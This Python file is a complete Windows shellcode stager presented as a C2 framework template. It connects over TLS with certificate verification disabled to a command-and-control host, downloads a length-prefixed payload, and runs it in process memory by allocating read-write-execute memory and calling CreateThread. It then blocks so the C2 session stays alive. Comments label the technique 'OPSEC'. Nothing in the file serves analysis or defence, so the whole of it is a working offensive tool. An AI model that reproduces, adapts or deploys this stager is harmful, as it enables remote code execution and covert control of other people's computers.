import ctypes
import ssl
import struct
from socket import socket, AF_INET, SOCK_STREAM

# --- FRAMEWORK TEMPLATE VARIABLES ---
C2_HOST = "127.0.0.1"
C2_PORT = 5000

class Start:
    
    def __init__(self):
        if self.connect(C2_HOST, C2_PORT):
            shellcode = self.recv_all()
            if shellcode:
                self.inject(shellcode)
                
        try:
            self.s.close()
        except AttributeError:
            pass
    
    def connect(self, host, port):
        try:
            raw_socket = socket(AF_INET, SOCK_STREAM)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            self.s = context.wrap_socket(raw_socket, server_hostname=host)
            self.s.connect((host, port))
            return True
        except Exception:
            return False
        
    def recv_all(self):
        try:
            raw_length = self._recv_exact(4)
            if not raw_length: return None
            payload_length = int.from_bytes(raw_length, 'big')
            return self._recv_exact(payload_length)
        except OSError:
            return None
            
    def _recv_exact(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.s.recv(n - len(data))
            if not packet: return None
            data.extend(packet)
        return bytes(data)
    
    def inject(self, shellcode):
        """
        OPSEC: Uses Windows Native APIs via ctypes to allocate 
        RWX (Read-Write-Execute) memory and execute raw shellcode.
        """
        try:
            # 1. Access Windows Kernel32 DLL natively
            k32 = ctypes.windll.kernel32
            
            # 2. VirtualAlloc: Allocate memory in the current Python process
            # 0x3000 = MEM_COMMIT | MEM_RESERVE
            # 0x40   = PAGE_EXECUTE_READWRITE
            k32.VirtualAlloc.restype = ctypes.c_void_p
            ptr = k32.VirtualAlloc(ctypes.c_int(0), 
                                   ctypes.c_int(len(shellcode)), 
                                   ctypes.c_int(0x3000), 
                                   ctypes.c_int(0x40))
            
            # 3. RtlMoveMemory: Copy our shellcode byte array into the allocated memory
            buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
            k32.RtlMoveMemory(ctypes.c_void_p(ptr), 
                              buf, 
                              ctypes.c_int(len(shellcode)))
            
            # 4. CreateThread: Execute the shellcode as a background thread inside Python.exe
            # This is where the magic happens.
            handle = k32.CreateThread(ctypes.c_int(0), 
                                      ctypes.c_int(0), 
                                      ctypes.c_void_p(ptr), 
                                      ctypes.c_int(0), 
                                      ctypes.c_int(0), 
                                      ctypes.pointer(ctypes.c_int(0)))
            
            # 5. WaitForSingleObject: Block the main Python thread forever so the C2 stays alive
            k32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
            
        except Exception as e:
            pass

# Initialize and execute the shellcode stager
Start()